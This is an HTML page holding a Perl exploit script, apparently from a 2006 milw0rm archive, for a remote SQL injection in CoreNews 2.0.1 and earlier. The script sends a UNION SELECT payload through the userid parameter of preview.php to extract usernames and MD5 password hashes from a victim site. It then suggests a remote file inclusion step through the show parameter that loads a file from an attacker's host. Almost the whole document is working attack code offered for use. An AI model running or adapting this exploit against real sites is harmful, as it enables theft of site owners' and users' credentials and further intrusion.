<html><head><title>CoreNews <= 2.0.1 (userid) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#Method found &amp; Exploit scripted by nukedx
#Contacts &gt; ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com
#Original advisory: http://www.nukedx.com/?viewdoc=24
#Usage: corenews.pl &lt;host&gt; &lt;path&gt;
use IO::Socket;
if(@ARGV != 2) { usage(); }
else { exploit(); }
sub header()
{
  print &quot;\n- NukedX Security Advisory Nr.2006-24\r\n&quot;;
  print &quot;- CoreNews &lt;= 2.0.1 Remote SQL Injection Exploit\r\n&quot;;
}
sub usage() 
{
  header();
  print &quot;- Usage: $0 &lt;host&gt; &lt;path&gt;\r\n&quot;;
  print &quot;- &lt;host&gt; -&gt; Victim's host ex: www.victim.com\r\n&quot;;
  print &quot;- &lt;path&gt; -&gt; Path to CoreNews ex: /corenews/\r\n&quot;;
  exit();
}
sub exploit () 
{
  #Our variables...
  $cnserver = $ARGV[0];
  $cnserver =~ s/(http:\/\/)//eg;
  $cnhost   = &quot;http://&quot;.$cnserver;
  $cndir    = $ARGV[1];
  $cnport   = &quot;80&quot;;
  $cntar    = &quot;preview.php?userid=&quot;;
  $cnxp     = &quot;-1/**/UNION/**/SELECT/**/null,concat(2022,login,20223,password,2203),null,null,null,null/**/FROM/**/corenews_users/*&quot;;
  $cnreq    = $cnhost.$cndir.$cntar.$cnxp;
  #Sending data...
  header();
  print &quot;- Trying to connect: $cnserver\r\n&quot;;
  $cn = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$cnserver&quot;, PeerPort =&gt; &quot;$cnport&quot;) || die &quot;- Connection failed...\n&quot;;
  print $cn &quot;GET $cnreq HTTP/1.1\n&quot;;
  print $cn &quot;Accept: */*\n&quot;;
  print $cn &quot;Referer: $cnhost\n&quot;;
  print $cn &quot;Accept-Language: tr\n&quot;;
  print $cn &quot;User-Agent: NukeZilla\n&quot;;
  print $cn &quot;Cache-Control: no-cache\n&quot;;
  print $cn &quot;Host: $cnserver\n&quot;;
  print $cn &quot;Connection: close\n\n&quot;;
  print &quot;- Connected...\r\n&quot;;
  while ($answer = &lt;$cn&gt;) {
    if ($answer =~ /2022(.*?)20223([\d,a-f]{32})2203/) {
      print &quot;- Exploit succeed!\r\n&quot;;
      print &quot;- Username: $1\r\n&quot;;
      print &quot;- MD5 HASH of PASSWORD: $2\r\n&quot;;
      print &quot;- If you crack hash you can use RFI with example -&gt;\r\n&quot;;
      print &quot;- Example: $cnhost$cndir?show=http://yourhost.com/file.txt\r\n&quot;; 
      exit();
    }
  }
  #Exploit failed...
  print &quot;- Exploit failed\n&quot;
}

# nukedx.com [2006-04-21]

# milw0rm.com [2006-04-21]</pre></html>